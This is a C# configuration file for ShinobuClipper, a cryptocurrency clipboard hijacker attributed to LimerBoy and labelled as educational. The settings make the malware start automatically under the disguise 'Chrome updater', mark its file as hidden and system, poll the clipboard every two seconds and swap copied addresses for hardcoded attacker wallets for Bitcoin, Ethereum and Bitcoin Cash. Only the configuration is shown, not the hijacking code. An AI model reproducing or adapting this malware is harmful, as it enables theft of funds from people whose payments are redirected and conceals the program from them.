/* 
    ^ Author    : LimerBoy
    ^ Name      : ShinobuClipper
    ^ Github    : https://github.com/LimerBoy
    > This program is distributed for educational purposes only.
*/

using System.Collections.Generic;

namespace Clipper
{
    internal sealed class config
    {
        // Autorun
        public static bool autorun_enabled = true;
        public static string autorun_name = "Chrome updater";
        // Set 'hidden' attribute
        public static bool attribute_hidden = true;
        // Set 'system' attribute
        public static bool attribute_system = true;
        // Clipboard check delay in seconds
        public static int clipboard_check_delay = 2;
        // Replace 
        public static Dictionary<string, string> addresses = new Dictionary<string, string>()
        {
            {"btc", "1AzxXLqLABEo5zSQhp1qJVAsx9CYX86vfU" },
            {"eth", "0x357C0541F19a7755AFbF1CCD824EE06059404238" },
            {"xmr", "" },
            {"xrp", "" },
            {"ltc", "" },
            {"neo", "" },
            {"bch", "qphk8ghgspmtmfrqfyalqxj48w9gtazuwuvz3xa26t" },
            {"dash", "" }
        };
        // Mutex
        public static string mutex = "asfrewrfwerewsf231";

    }
}
